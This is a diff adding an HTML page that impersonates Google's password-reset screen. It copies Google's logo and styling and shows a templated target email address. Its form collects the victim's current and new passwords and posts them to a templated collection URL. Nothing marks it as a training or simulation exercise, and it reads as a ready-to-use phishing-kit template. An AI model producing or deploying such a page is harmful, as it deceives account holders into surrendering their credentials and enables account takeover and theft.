@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google - Reset your password</title>
+    <style>
+        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .logo { width: 75px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
+        p { font-size: 16px; color: #202124; margin-bottom: 30px; }
+        .input-group { position: relative; margin-bottom: 25px; text-align: left; }
+        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; }
+        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        .btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; float: right; margin-top: 10px; }
+        .btn:hover { background-color: #1b66c9; box-shadow: 0 1px 3px 1px rgba(66,133,244,0.15); }
+        .clear { clear: both; }
+        .footer { margin-top: 50px; text-align: left; font-size: 12px; color: #70757a; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+        <h1>Change password</h1>
+        <p>Enter a new password for <strong>{{TARGET_EMAIL}}</strong> to regain access to your account.</p>
+        <form action="{{POST_URL}}" method="POST">
+            <div class="input-group">
+                <input type="password" name="old_password" placeholder="Current password" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="new_password" placeholder="Create new password" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="confirm_password" placeholder="Confirm new password" required>
+            </div>
+            <button type="submit" class="btn">Change password</button>
+            <div class="clear"></div>
+        </form>
+        <div class="footer">
+            English (United States) &nbsp;&nbsp; Help &nbsp;&nbsp; Privacy &nbsp;&nbsp; Terms
+        </div>
+    </div>
+</body>
+</html>
